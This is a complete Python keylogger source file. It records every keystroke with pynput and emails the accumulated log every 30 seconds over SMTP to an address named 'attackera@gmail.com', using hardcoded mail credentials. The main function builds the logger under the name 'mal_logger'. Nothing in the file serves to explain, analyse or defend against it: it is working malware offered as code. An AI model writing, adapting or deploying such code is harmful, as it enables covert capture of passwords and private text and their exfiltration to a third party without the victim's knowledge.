import smtplib
import threading
from pynput import keyboard


class KeyLogger:
    def __init__(self, interval, email, password):
        self.interval = interval
        self.log = "-------- KeyLogger has started ------"
        self.email = email
        self.password = password

    def add_to_log(self, string):
        self.log = self.log + string

    # Create Keylogger
    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("-----Exiting program------")
                return False
            else:
                current_key = " " + str(key) + " "

        self.add_to_log(current_key)

    # Create underlying back structure which will publish emails
    def send_mail(self, email, password, message):
        sender = "temp.sender@gmail.com"
        receiver = "attackera@gmail.com"

        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(sender, receiver, message)

    # Send Email

    def send_message(self):
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.send_message)
        timer.start()

    # Start KeyLogger and Send Off Emails
    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.send_message()
            keyboard_listener.join()


def main():
    mal_logger = KeyLogger(
        30, "ba8b8e4507d336", "6957b9af89952e")
    mal_logger.start()


if __name__ == "__main__":
    main()
